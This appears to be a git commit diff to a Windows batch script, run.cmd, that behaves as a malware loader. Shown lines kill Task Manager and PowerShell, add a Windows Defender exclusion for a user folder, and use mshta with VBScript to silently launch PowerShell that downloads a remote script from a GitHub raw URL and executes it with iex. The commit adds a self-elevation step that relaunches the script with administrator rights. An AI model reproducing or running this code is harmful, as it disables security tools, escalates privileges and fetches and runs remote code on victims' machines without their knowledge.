97e7a6a5da0f0c3ad44ee07ae6a989a9d43bb44c
43a1723 <hai1723notgay@gmail.com>
2024-06-03 13:22:15 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -3,4 +3,7 @@ taskkill /f /im taskmgr.exe
 taskkill /f /im powershell.exe
 start powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%userprofile%\150F4013'"
 
+net session >nul 2>&1
+if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
+cd /d %~dp0
 mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t",0))
